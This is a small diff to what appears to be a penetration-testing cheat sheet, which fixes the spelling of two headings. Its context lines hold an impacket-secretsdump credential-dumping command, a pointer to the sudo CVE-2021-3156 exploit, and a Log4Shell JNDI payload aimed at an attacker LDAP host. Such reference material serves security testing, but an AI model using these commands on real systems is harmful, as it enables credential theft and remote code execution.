@@ -4677,7 +4677,7 @@ impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>
 
 > https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435
 
-##### Pre-requisistes
+##### Prerequisistes
 
 - Ubuntu 20.04 (Sudo 1.8.31)
 - Debian 10 (Sudo 1.8.27)
@@ -4719,7 +4719,7 @@ ${jndi:ldap://<LHOST>:1389/ci1dfd}
 
 > https://github.com/kozmer/log4j-shell-poc
 
-###### Pre-requisistes
+###### Prerequisistes
 
 > https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
 
